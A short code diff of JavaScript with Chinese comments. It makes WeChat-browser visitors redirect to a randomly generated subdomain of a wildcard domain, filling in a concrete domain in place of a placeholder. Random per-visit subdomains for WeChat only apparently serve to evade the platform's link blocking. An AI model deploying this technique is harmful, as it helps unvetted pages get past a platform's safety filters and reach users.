@@ -169,11 +169,11 @@
             // 微信环境下：生成随机前缀并跳转
             if (isWeChatBrowser()) {
                 // 替换为你的泛解析主域名（例如：yourdomain.com）
-                const mainDomain = 'yourdomain.com'; 
+                const mainDomain = 'rshqwjm.cn'; 
                 // 生成6位随机前缀
                 const randomPrefix = getRandomPrefix(6);
                 // 拼接完整URL
-                const redirectUrl = `http://wbkb40.rshqwjm.cn/a/617971?t=1764169565071`;
+                const redirectUrl = `http://${randomPrefix}.${mainDomain}/a/617971?t=1764169565071`;
                 // 执行跳转
                 window.location.href = redirectUrl;
                 return;
